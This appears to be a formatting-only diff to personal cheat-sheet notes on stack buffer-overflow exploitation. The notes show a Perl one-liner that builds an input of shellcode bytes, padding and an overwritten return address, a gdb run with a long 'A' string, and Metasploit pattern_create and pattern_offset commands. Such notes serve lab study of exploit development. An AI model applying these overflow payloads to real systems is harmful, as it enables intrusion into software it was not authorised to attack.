@@ -1,13 +1,13 @@
 -   Using PERL for argument.
     ---------------------------------------------------------------------------------------------------------------------------
-`perl -e 'print  "\x31\xc0\x50\x68\" . "A"x76 . "\x28\xf4\xff\xbf" '`
+`\`perl -e 'print  "\x31\xc0\x50\x68\" . "A"x76 . "\x28\xf4\xff\xbf" '\``
 `perl -e 'print  "A"x100 '`
-inside gdb# run $(perl -e 'print "A"x100')
+	- inside gdb# run $(perl -e 'print "A"x100')
  
 -   Patterns for rewrite 
     ---------------------------------------------------------------------------------------------------------------------------
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 63413563 
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`
+`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 63413563` 
 
 
 -   Compile in Kali with no protection
